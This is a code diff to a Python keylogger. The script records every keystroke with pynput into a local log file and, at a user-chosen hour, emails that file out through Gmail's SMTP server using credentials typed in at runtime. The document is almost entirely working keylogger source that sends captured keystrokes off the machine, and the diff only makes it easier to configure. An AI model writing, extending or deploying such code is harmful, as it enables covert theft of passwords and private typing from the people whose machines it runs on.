@@ -1,6 +1,7 @@
 # import modules
 import datetime
 import logging
+import random
 import smtplib
 import threading
 from email import encoders
@@ -9,25 +10,31 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from pynput.keyboard import Listener
 
-def send_mail():
+
+sender_email = input("Enter the email you would like your output file delivered to>> ")
+email_password = input("Enter password associcated with email account above>> ")
+time_to_send = int(input("Enter time you would like to have email delivered (24 hour clock Enter in range > [1-24]) >>"))
+
+def send_mail(email, password):
     # Back structure to publish emails
     #user credentials
-    fromaddr = "email sending info from" #your email
-    toaddr = "email sending info to"     #recipient of email
-    subject = "subject message"     #what ever you want the subject of the email to be...
+    fromaddr = email #your email
+    toaddr = email     #recipient of email
+    subject = "Python Log"     #what ever you want the subject of the email to be...
+    mess = ["Logging has commenced!", "Let the logging begin!", "Time to log!"]
     #builds up the email
     msg = MIMEMultipart()
     msg['From'] = fromaddr
     msg['To'] = toaddr
     msg['Subject'] = subject
 
-    body = "Logging has commenced!"  #<---- whatever message you want here...
+    body = random.choice(mess)  #<---- whatever message you want here...
     # attach as a mime text part
     msg.attach(MIMEText(body, "plain"))
 
     #open file to be sent
-    log_file = r"full path of file you want the logs saved to"   #<-----only tried in .txt file
-    attachment = open(log_file, "rb")
+    log_file = r"key_log.txt"   #<-----only tried in .txt file
+    attachment = open(log_file, "r")
     #allows you to upload an attachment
     part = MIMEBase("application", "octet-stream")
     part.set_payload((attachment).read())
@@ -41,12 +48,12 @@ def send_mail():
     text = msg.as_string()
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
-    server.login(fromaddr, "password")  # <-----input a password here
+    server.login(fromaddr, password)  # <-----input a password here
 
     server.sendmail(fromaddr, toaddr, text)
     server.quit()
 # if no name it gets put into an empty string
-log_dir = " "
+log_dir = ""
 
 ########## this is the basic logging function###########
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format ='%(asctime)s: %(message)s:')
@@ -59,12 +66,17 @@ def on_press(key):
 
 #setting datetime to identify current time and associate it with the set time variable
 
+count = 0
 with Listener(on_press=on_press) as listener:
+    
     while True:
         currentTimeOfDay = datetime.datetime.now()
         currentHour = currentTimeOfDay.hour
-        sethour = 20   #changes the time the email sends (24-hour clock) currently at 9:00
+        sethour = time_to_send   #changes the time the email sends (24-hour clock)              
         if currentHour == sethour:
-            send_mail()
-            break
-    listener.join()
+            if count == 0:
+                send_mail(sender_email, email_password)
+                count += 1
+            elif count != 0:
+                sethour += 1
+            listener.join()
